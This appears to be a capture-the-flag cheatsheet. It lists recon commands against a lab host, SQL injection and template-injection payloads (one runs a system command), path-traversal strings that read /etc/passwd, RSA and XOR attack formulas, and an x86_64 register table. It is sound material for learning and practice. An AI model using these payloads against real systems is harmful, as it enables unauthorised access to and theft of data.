# CTF Quick Reference & Payload Cheatsheet

> Domain: CTF Quick Reference, Payload Signatures & Extraction Commands
> Classification: AUTHORITATIVE REFERENCE

## 1. Quick Terminal Discovery One-Liners

```bash
# Web & API Quick Recon
curl -i -X OPTIONS http://target.lab/api/
curl -s -L http://target.lab/robots.txt
curl -s http://target.lab/.git/HEAD # Check for exposed .git directory

# File & Binary Quick Checks
file target_file
strings -a -n 6 target_file | grep -iE "flag|ctf|key|admin|pass"
binwalk -e target_file # Extract embedded archives

# Multi-Layer Decoding Helpers
python scripts/cipher_toolkit.py --data "666c61677b... " --mode auto
python scripts/stego_inspector.py --file mystery.png
python scripts/pcap_dissector.py --file capture.pcap
```

---

## 2. High-Frequency Web Payloads

### SQL Injection Bypass & Triage
```sql
' OR '1'='1
admin' --
admin' #
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT 1, tbl_name, sql FROM sqlite_master--
```

### Server-Side Template Injection (SSTI)
```jinja2
{{ 7 * 7 }}
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Local File Inclusion (LFI) & Path Traversal
```text
../../../../etc/passwd
....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

---

## 3. High-Frequency Cryptanalysis Formulas

- **RSA Small $e=3$:** `m = gmpy2.iroot(c, 3)[0]`
- **Fermat Factorization ($p \approx q$):** `a = isqrt(N); while not is_square(a*a - N): a += 1`
- **XOR Single-Byte:** `bytes([b ^ key for b in ciphertext])`
- **Common Modulus:** $a \cdot e_1 + b \cdot e_2 = 1 \implies c_1^a \cdot c_2^b \equiv m \pmod N$

---

## 4. Reverse Engineering Key Assembly Registers (x86_64)

| Register | Common Role / Calling Convention (SysV ABI) |
|---|---|
| `RAX` | Return value dari fungsi / syscall number |
| `RDI` | Argumen ke-1 fungsi |
| `RSI` | Argumen ke-2 fungsi |
| `RDX` | Argumen ke-3 fungsi |
| `RCX` | Argumen ke-4 fungsi / loop counter |
| `RSP` | Stack Pointer (top of stack) |
| `RBP` | Base / Frame Pointer (bottom of current stack frame) |
| `RIP` | Instruction Pointer (alamat instruksi berikutnya) |
